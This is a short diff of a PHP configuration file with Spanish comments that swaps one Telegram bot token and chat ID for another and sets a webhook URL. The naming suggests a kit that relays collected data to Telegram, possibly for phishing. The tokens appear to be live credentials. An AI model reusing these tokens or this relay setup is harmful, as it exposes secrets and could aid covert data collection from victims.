@@ -11,7 +11,7 @@ if (basename($_SERVER['PHP_SELF']) === basename(__FILE__)) {
 }
 
 // ⚙️ Configuración principal (solo accesible por inclusión)
-$bot_token_2 = '8843494963:AAHucmgpOt9uLfxNLxQQ8Uv2B5yqs4brJYU';  
-$chat_id_2   = '-5030882726';
+$bot_token_2 = '8045219750:AAEvUarc0qdeWJRmzkOVQ4gBpBrB1I6RDH0';  
+$chat_id_2   = '-5289462105';
 $webhook_url = 'https://promosbnc.up.railway.app/approve.php'; //Reemplaza (LINK_AQUI) completo, por tu link.
 ?>
